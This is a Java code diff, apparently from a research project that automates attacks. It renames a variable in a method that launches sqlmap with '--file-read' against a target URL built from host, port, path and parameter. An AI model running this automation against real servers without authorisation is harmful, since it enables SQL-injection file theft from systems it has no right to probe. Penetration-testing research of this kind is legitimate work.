@@ -129,26 +129,26 @@ public class Action {
 	 */
 	private Object runSQLReadFileSQLMap(Term action) {
 		Term[] args = action.args();
-		String host = args[0].toString(), file = args[2].toString(), 
+		String target = args[1].toString(), file = args[2].toString(), 
 				port = args[3].toString(), base = args[4].toString(), 
 				param = args[5].toString();
-		if (host.startsWith("'") && host.endsWith("'"))
-			host = host.substring(1,host.length()-1);
+		if (target.startsWith("'") && target.endsWith("'"))
+			target = target.substring(1,target.length()-1);
 		if (base.startsWith("'") && base.endsWith("'"))
 			base = base.substring(1,base.length()-1);
 		if (file.startsWith("'") && file.endsWith("'"))
 			file = file.substring(1,file.length()-1);
-		System.out.println("Running SQLMap readfile on " + host + " with port " + port + ", base " + base + 
+		System.out.println("Running SQLMap readfile on " + target + " with port " + port + ", base " + base + 
 				" and parameter " + param + "\n");
 		String call = "/usr/bin/python" +
 				" /Users/jim/repo/Projects/ARL/sqlmapproject-sqlmap-1aafe85/sqlmap.py" +
-				" -u http://" + host + ":" + port + "/" + base
+				" -u http://" + target + ":" + port + "/" + base
 				+ "?" + param + "=1 --file-read="+file;
 		
 		System.out.println("Making call: " + call);
 		ProcessBuilder scanBuilder = new ProcessBuilder("/usr/bin/python",
 				"/Users/jim/repo/Projects/ARL/sqlmapproject-sqlmap-1aafe85/sqlmap.py",
-				"-u", "http://" + host + ":" + port + "/" + base + "?" + param + "=1", 
+				"-u", "http://" + target + ":" + port + "/" + base + "?" + param + "=1", 
 				"--file-read="+file);
 		int exitValue = 0;
 		try {
